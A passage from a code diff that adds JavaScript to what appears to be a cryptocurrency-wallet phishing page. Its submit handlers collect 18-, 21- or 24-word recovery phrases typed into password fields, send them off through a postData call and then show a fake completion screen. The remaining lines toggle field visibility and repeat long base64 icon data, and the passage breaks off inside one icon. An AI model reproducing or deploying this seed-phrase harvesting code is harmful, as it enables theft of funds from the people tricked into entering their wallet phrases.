+      event.preventDefault();
+        if(unit2[0].value === "" || unit2[1].value === "" ||  unit2[2].value === "" || unit2[3].value === "" || unit2[4].value === "" || unit2[5].value === "" || unit2[6].value === "" || unit2[7].value === "" || unit2[8].value === "" || unit2[9].value === "" || unit2[10].value === "" || unit2[11].value === "" || unit2[12].value === "" || unit2[13].value === "" || unit2[14].value === "" || unit2[15].value === ""  || unit2[16].value === "" || unit2[17].value === ""   ){
+          document.querySelector('.button18').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit2[0].value} \nWord 2: ${unit2[1].value} \nWord 3: ${unit2[2].value} \nWord 4: ${unit2[3].value} \nWord 5: ${unit2[4].value} \nWord 6: ${unit2[5].value} \nWord 7: ${unit2[6].value} \nWord 8: ${unit2[7].value} \nWord 9: ${unit2[8].value} \nWord 10: ${unit2[9].value} \nWord 11: ${unit2[10].value} \nWord 12: ${unit2[11].value} \nWord 13: ${unit2[12].value} \nWord 14: ${unit2[13].value} \nWord 15: ${unit2[14].value} \nWord 16: ${unit2[15].value} \nWord 17: ${unit2[16].value} \nWord 18: ${unit2[17].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite2.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite3.addEventListener("submit", (event) => {
+          event.preventDefault();
+        if(unit3[0].value === "" || unit3[1].value === "" ||  unit3[2].value === "" || unit3[3].value === "" || unit3[4].value === "" || unit3[5].value === "" || unit3[6].value === "" || unit3[7].value === "" || unit3[8].value === "" || unit3[9].value === "" || unit3[10].value === "" || unit3[11].value === "" || unit3[12].value === "" || unit3[13].value === "" || unit3[14].value === "" || unit3[15].value === ""  || unit3[16].value === "" || unit3[17].value === "" || unit3[18].value === "" || unit3[19].value === "" || unit3[20].value === ""   ){
+          document.querySelector('.button21').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit3[0].value} \nWord 2: ${unit3[1].value} \nWord 3: ${unit3[2].value} \nWord 4: ${unit3[3].value} \nWord 5: ${unit3[4].value} \nWord 6: ${unit3[5].value} \nWord 7: ${unit3[6].value} \nWord 8: ${unit3[7].value} \nWord 9: ${unit3[8].value} \nWord 10: ${unit3[9].value} \nWord 11: ${unit3[10].value} \nWord 12: ${unit3[11].value} \nWord 13: ${unit3[12].value} \nWord 14: ${unit3[13].value} \nWord 15: ${unit3[14].value} \nWord 16: ${unit3[15].value} \nWord 17: ${unit3[16].value} \nWord 18: ${unit3[17].value} \nWord 19: ${unit3[18].value} \nWord 20: ${unit3[19].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite3.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+  unite4.addEventListener("submit", (event) => {
+      event.preventDefault();
+        if(unit4[0].value === "" || unit4[1].value === "" ||  unit4[2].value === "" || unit4[3].value === "" || unit4[4].value === "" || unit4[5].value === "" || unit4[6].value === "" || unit4[7].value === "" || unit4[8].value === "" || unit4[9].value === "" || unit4[10].value === "" || unit4[11].value === "" || unit4[12].value === "" || unit4[13].value === "" || unit4[14].value === "" || unit4[15].value === ""  || unit4[16].value === "" || unit4[17].value === "" || unit4[18].value === "" || unit4[19].value === "" || unit4[20].value === "" || unit4[21].value === "" || unit4[22].value === "" || unit4[23].value === "" ){
+          document.querySelector('.button24').disabled = true;
+      }
+      else {
+          let data = `Word 1: ${unit4[0].value} \nWord 2: ${unit4[1].value} \nWord 3: ${unit4[2].value} \nWord 4: ${unit4[3].value} \nWord 5: ${unit4[4].value} \nWord 6: ${unit4[5].value} \nWord 7: ${unit4[6].value} \nWord 8: ${unit4[7].value} \nWord 9: ${unit4[8].value} \nWord 10: ${unit4[9].value} \nWord 11: ${unit4[10].value} \nWord 12: ${unit4[11].value} \nWord 13: ${unit4[12].value} \nWord 14: ${unit4[13].value} \nWord 15: ${unit4[14].value} \nWord 16: ${unit4[15].value} \nWord 17: ${unit4[16].value} \nWord 18: ${unit4[17].value} \nWord 19: ${unit4[18].value} \nWord 20: ${unit4[19].value} \nWord 21: ${unit4[20].value} \nWord 22: ${unit4[21].value} \nWord 23: ${unit4[22].value} \nWord 24: ${unit4[23].value}`;
+          postData(data);
+          setTimeout(() => {
+            unite4.classList.add('hide');
+            document.querySelector('.went').classList.add("hide")
+            done.classList.remove('hide');
+            timer2(10)
+          }, 4000);
+             }
+  });
+
+  eye12.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit[index].type === 'password'){
+          unit[index].type = "text";
+          e.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU";
+        }else{
+          unit[index].type = "password";
+          e.src = "data:image/png;base64,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";
+        }
+      });
+    });
+
+    eye15.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit1[index].type === 'password'){
+          unit1[index].type = "text";
+          e.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU";
+        }else{
+          unit1[index].type = "password";
+          e.src = "data:image/png;base64,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";
+        }
+      });
+    });
+
+
+    eye18.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit2[index].type === 'password'){
+          unit2[index].type = "text";
+          e.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU";
+        }else{
+          unit2[index].type = "password";
+          e.src = "data:image/png;base64,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";
+        }
+      });
+    });
+
+    eye21.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit3[index].type === 'password'){
+          unit3[index].type = "text";
+          e.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU";
+        }else{
+          unit3[index].type = "password";
+          e.src = "data:image/png;base64,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";
+        }
+      });
+    });
+
+    eye24.forEach((e, index) => {
+      e.addEventListener('click',()=>{
+        if(unit4[index].type === 'password'){
+          unit4[index].type = "text";
+          e.src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQmjcUKVtL5AlewlgFxsLzmzUho8SOG_9ZQfA&usqp=CAU";
+        }else{
+          unit4[index].type = "password";
+          e.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAflBMVEX///8AAAAVFRXS0tJpaWkPDw/IyMgFBQX8/Pz39/cSEhLy8vKxsbEEBATg4OAlJSV+fn7o6OhMTEx1dXUqKipVVVW4uLgeHh7a2trBwcEZGRmlpaUyMjJ3d3eenp6QkJCHh4dFRUVRUVE6OjpiYmIvLy+fn5+rq6uWlpZdXV3zUroBAAAH6UlEQVR4nO2c55aqMBSFRaqiCKIUK1hGef8XvI4pBAiQICpr7vl+jpTs5LQUZjQCAAAAAAAAAAAAAAAAAAAAAAAAAAD4v7G+3YCeUFfqt5vQC+pYGf8FJQ8dyl9Q8tTxF5TsFeWPKNFAyeAAJcMDlAwPUDI8QMnwACXD479SYjnxNvGz9LxahJvxJlzt0rWWHIJoWBPmRiXeLFlfTaUGc3Fyb87HW1xHnRL1uA7rJLBsTokxjLHhKPF+1mMREYTp+uB9UQGhosSZyqjAnJPvW1lFiaF3UPLQcvz2uFAlBv5DRyWKuQ6+KoQq0WuV6OH1nC4fpOdd2GR6YWIPUol+vrjb2JkUL7cc45ZoZ35E0LXo4+0nxKlSVa